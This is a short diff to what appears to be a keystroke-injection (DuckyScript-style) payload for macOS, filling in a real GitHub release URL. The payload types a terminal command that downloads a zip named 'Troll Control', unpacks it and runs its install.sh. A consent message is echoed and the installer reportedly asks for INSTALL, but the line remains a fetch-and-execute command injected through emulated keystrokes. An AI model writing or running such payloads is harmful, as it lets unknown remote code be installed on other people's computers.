@@ -16,7 +16,7 @@ ENTER
 DELAY 1500
 STRING echo 'This installs Troll Control visibly. Review the prompt and type INSTALL only if authorized.'
 ENTER
-STRING curl -fL 'GITHUB_RELEASE_URL_HERE' -o ~/Downloads/TrollControl-mac.zip && ditto -x -k ~/Downloads/TrollControl-mac.zip ~/Downloads && cd ~/Downloads/TrollControl-mac/MAC && chmod +x install.sh && ./install.sh
+STRING curl -fL 'https://github.com/thefacerenz-droid/payloadmac/releases/download/v1.0.0/TrollControl-mac.zip' -o ~/Downloads/TrollControl-mac.zip && ditto -x -k ~/Downloads/TrollControl-mac.zip ~/Downloads && cd ~/Downloads/TrollControl-mac/MAC && chmod +x install.sh && ./install.sh
 ENTER
 
 The Terminal remains open and install.sh asks the Mac owner to type INSTALL.
